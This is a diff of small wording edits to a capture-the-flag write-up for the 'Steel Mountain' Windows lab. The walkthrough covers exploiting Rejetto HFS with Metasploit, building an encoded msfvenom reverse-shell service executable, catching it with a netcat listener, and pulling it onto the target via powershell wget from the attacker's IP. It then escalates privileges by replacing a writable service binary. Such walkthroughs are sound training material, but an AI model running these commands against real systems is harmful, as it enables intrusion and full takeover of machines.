@@ -124,7 +124,7 @@ The employee of the month can easily be found by visiting the web page of this m
 
 ![image](https://user-images.githubusercontent.com/14150485/174669753-65d30e4b-d38e-47b4-93b6-f7ac29be9111.png)
 
-If you are a Mr. Robot fan you will most likely have the answer as soon as the page loads. If not, feel free to inspect the image and get the name - Then schedule to watch Mr. Robot, this show really is one of a kind!
+If you are a Mr. Robot fan you will most likely have the answer as soon as you land on the page. If not, feel free to inspect the image to get the name - Then make sure you watch Mr. Robot, the show really is one of a kind!
 
 <br />
 
@@ -138,11 +138,11 @@ If you are a Mr. Robot fan you will most likely have the answer as soon as the p
 
 <br />
 
-Visit the secondary web page on port `8080` using a browser to get the server details by clicking the link under the `server information` area to the left, the exploit for which can be found on [Exploit Database](https://www.exploit-db.com/).
+Visit the secondary web page on port `8080` on a browser to get the server details by clicking the link under the `server information` area to the left, the exploit for which can be found on [Exploit Database](https://www.exploit-db.com/).
 
-Since we will be using Metasploit for this step, the initial access should be pretty easy to get once we update the relevant `RHOSTS`, `RPORT` and `LHOST` options for this module in the `msfconsole` and run the exploit - Please note that this might take a couple of minutes to complete.
+Since we will be using Metasploit for this step, the initial access should be pretty straightforward once we update the relevant `RHOSTS`, `RPORT` and `LHOST` options for this module in the `msfconsole` and run the exploit - Please note that this might take a couple of minutes to complete.
 
-Once in, the flag for this step can be found on the user's desktop folder.
+Once complete, the flag for this step can be found on the user's desktop folder.
 
 ```
 meterpreter > pwd
@@ -211,7 +211,7 @@ Saved as: ASCService.exe
 
 <br />
 
-Set up an active listener locally using the same local port value we assigned to the `msfvenom` payload.
+Set up an active `netcat` listener locally using the same local port value we assigned to the `msfvenom` payload.
 
 ```
 nc -lvnp LOCAL_PORT
@@ -262,7 +262,7 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-Once the connection has been established with our `netcat` listener we can navigate to the `Administrator`'s desktop to get the flag.
+Once the connection has been established with our listener we can navigate to this user's desktop directory to get the flag.
 
 ```
 ╭─root@kali ~  
@@ -305,13 +305,13 @@ We just pwned Steel Mountain using Metasploit!
 
 <br />
 
-Now for a more manual approach to rooting this machine - This section should be particularly useful as a basic refresher to anyone preparing for the OSCP exam, which does not allow the use of Metasploit.
+Now for a manual approach to rooting this machine - This section should be particularly useful as a basic refresher to anyone preparing for the OSCP exam, which does not allow the use of Metasploit.
 
 Navigate to [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161/) and download a copy of this exploit, as we will be using this to gain initial access to the target after updating the `ip_addr` and `local_port` values with our local IP and port values.
 
 As mentioned in the task, this will only work having both an active `netcat` listener and a web server running at the same time and from the same location.
 
-Start a `netcat` listener on the port number specified on the exploit. Then, proceed to copy the `nc.exe` file located under `/usr/share/windows-resources/binaries/` to your preferred location and start a `python` server listening on port 80 from that same directory. Once everything is set execute the exploit script twice and the `netcat` window will establish a connection to the target machine.
+Start a `netcat` listener on the port number specified on the exploit. Then, proceed to copy the `nc.exe` file located in `/usr/share/windows-resources/binaries/` to your preferred location and start a `python` server listening on port 80 from that same directory. When all set, execute the exploit script twice and the connection will be established with our `netcat` listener.
 
 ![image](https://user-images.githubusercontent.com/14150485/174684756-c6560791-0f1c-4630-97e5-9cf10b8faeda.png)
 
@@ -356,7 +356,7 @@ The results from `WinPEAS` return a list of vulnerable services that we could po
 
 <br />
 
-We can further investigate this service from its parent directory to see if we can manually start/stop it, as well as write over it - Should that be the case, we can replace it to escalate our privileges.
+We can further investigate this service from its parent directory to see if we can manually interact with it, as well as write over it - Should that be the case, we can replace it to escalate our privileges.
 
 ```
 C:\Program Files (x86)\IObit>sc qc AdvancedSystemCareService9
@@ -394,7 +394,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 <br />
 
-Looks like this is indeed an interactive service and our user has read, write and execute permissions on the folder, we can therefore proceed to replace it with a reverse shell and restart it.
+Looks like this is indeed an interactive service and our user has read, write and execute permissions on the containing folder, meaning we can proceed to replace it with a reverse shell and restart it.
 
 <br />
 <br />
@@ -403,7 +403,7 @@ Looks like this is indeed an interactive service and our user has read, write an
 
 <br />
 
-Create a payload using `msfvenom` as instructed in Task 3.
+Create a Windows reverse shell payload using `msfvenom` as instructed in Task 3.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
@@ -411,7 +411,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shi
 
 <br />
 
-Use the command provided on the task to stop the service on the target machine.
+Use the relevant `sc` command, also provided on the task, to stop the service on the target machine.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
@@ -429,7 +429,7 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-Transfer the reverse shell to the target via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise set up a temporary one from scratch.
+Transfer the reverse shell to the target via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise go ahead an set up a temporary one again.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c wget "http://LOCAL_IP:80/ASCService.exe" -outfile "ASCService.exe"
@@ -452,7 +452,7 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-The next step is to ensure we set up an active `netcat` shell listening to the port number specified on the reverse shell.
+The next step is to ensure we set up a `netcat` listening to the port number specified on the reverse shell.
 
 ```
 nc -lvnp LOCAL_PORT
